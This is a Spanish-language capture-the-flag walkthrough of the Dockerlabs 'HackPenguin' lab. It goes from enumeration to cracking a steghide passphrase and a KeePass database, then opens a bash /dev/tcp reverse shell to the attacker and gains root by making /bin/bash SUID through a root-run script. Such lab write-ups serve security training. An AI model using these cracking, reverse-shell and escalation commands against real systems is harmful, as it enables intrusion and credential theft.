
# Writeup Template: Maquina `[ HackPenguin ]`

- Tags: #HackPenguin #Keepass2
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina HackPenguin](https://mega.nz/file/ELkQSLxT#NH61P-i3H7eN6uNmc1egG7pxDfpW2-AljnxJ2hL6W_M) Laboratorio donde se practica esteganografía para el acceso a una base de datos de KeePass.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x hackpenguin.zip
sudo bash auto_deploy.sh hackpenguin.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((UbuntuJammy))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada relevante.

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,py,js,java,pl,cgbin
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10671]
/penguin.html         (Status: 200) [Size: 342]
```
### Esteganografia:
En esta direccion url tenemos una imagen que nos descargaremos a nuestro equipo local de atacante para realizar pruebas de **esteganografia**
Una ves descargada verificamso que tipo de archivo es:
```bash
file penguin.jpg
penguin.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1600x1200, components 3
```

Si intentamos ver la informacion oculta en la imagen no podemos ya que necesitamos una contrasena:
```bash
steghide info penguin.jpg

"penguin.jpg":
  formato: jpeg
  capacidad: 13.3 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
steghide: �no pude extraer ning�n dato con ese salvoconducto!
```

Ahora relizaremos un ataque de fuerza bruta para intentar obtener la contrasena:
```bash
stegseek --crack penguin.jpg
```

Resultado:
```bash
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "chocolate"      

[i] Original filename: "penguin.kdbx".
[i] Extracting to "penguin.jpg.out".
```

Ahora que tenemos la contrasena procedemos a extraer los archivos:
```bash
steghide extract -sf penguin.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"penguin.kdbx".
```

Tenemos una base de datos de **keeypass** pero para pdoer verla tenemos que instalarlo:
```bash
sudo apt install keepass2
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos una base de datos intentaremos ejecutarla.

### Ejecucion del Ataque
```bash
# Comandos para explotación
keepass2 penguin.kdbx
```

Ahora realizaremos un ataque de fuerza bruta para obtener la contrasena de dicha base de datos:
```bash
keepass2john penguin.kdbx > hash
```

Ahora lanzamos el ataque de fuerza bruta:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Obtenemos la contrasena:
```bash
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (penguin)
```

Volvemos a iniciar la base de datos ya con la contrasena:
```bash
keepass2 penguin.kdbx # ( password1 )
```

Ahora tenemos la crecenciales:
```bash
pinguinomaravilloso123
```

### Intrusion
Nos conectamos por **ssh** pero solo para mandarnos una **revershell** a nuestro equipo de atacante:
```bash
ssh-keygen -R 172.17.0.2 && ssh penguin@172.17.0.2
```

Modo escucha
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
bash -c 'exec bash -i &>/dev/tcp/172.17.0.1/443 <&1'
```

---

## Escalada de Privilegios

###### Usuario `[ Penguin ]`:
Vemos que esta archivo esta siendo ejecutado por **root**
```bash
cat script.sh 
#!/bin/bash
echo 'pinguino no hackeable' > archivo.txt
```

Asi que nos aprovechamos que tiene permsios de escritura para ineyctar la siguiente linea:
```bash
chmod u+s /bin/bash
```

Ahora solo esperamos a que se ejecute la tarea:
```bash
ls -l /bin/bash

-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Ahora solo migramos a **root**
```bash
# Comando para escalar al usuario: ( root )
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
whoami
root
```

---